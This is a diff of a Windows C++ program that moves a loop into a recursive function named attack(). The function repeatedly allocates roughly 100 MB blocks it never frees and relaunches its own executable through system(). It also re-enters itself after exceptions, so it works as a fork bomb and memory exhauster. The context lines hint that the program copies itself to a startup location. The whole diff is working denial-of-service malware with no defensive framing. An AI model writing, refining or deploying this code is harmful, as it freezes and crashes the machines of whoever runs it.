@@ -45,6 +45,37 @@ void begin(char* szPathbeg){
 	StarterSrc.close();
 	StarterDst.close();
 }
+void attack(string startCommand){
+	while(true){
+		try{
+			new char[107370900];
+			system(startCommand.c_str());
+			new char[107370900];
+			system(startCommand.c_str());
+			new char[107370900];
+			system(startCommand.c_str());
+			new char[107370900];
+			system(startCommand.c_str());
+			new char[107370900];
+			system(startCommand.c_str());
+			new char[107370900];
+			system(startCommand.c_str());
+			new char[107370900];
+			system(startCommand.c_str());
+			new char[107370900];
+			system(startCommand.c_str());
+			new char[107370900];
+			system(startCommand.c_str());
+		}catch(exception e){
+			new char[107370900];
+			system(startCommand.c_str());
+			new char[107370900];
+			system(startCommand.c_str());
+			attack(startCommand);
+		}
+		attack(startCommand);
+	}
+}
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int cmdShow){
 	char  szPath[MAX_PATH];
 	PSTR  lpFilename;
@@ -58,25 +89,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 	//return 0;
 	string startCommand;
 	startCommand = "\"" + startupPath + "\"";
-	while(true){
-		new char[107370900];
-		system(startCommand.c_str());
-		new char[107370900];
-		system(startCommand.c_str());
-		new char[107370900];
-		system(startCommand.c_str());
-		new char[107370900];
-		system(startCommand.c_str());
-		new char[107370900];
-		system(startCommand.c_str());
-		new char[107370900];
-		system(startCommand.c_str());
-		new char[107370900];
-		system(startCommand.c_str());
-		new char[107370900];
-		system(startCommand.c_str());
-		new char[107370900];
-		system(startCommand.c_str());
-	}
+	attack(startCommand);
 	return 0;
 }
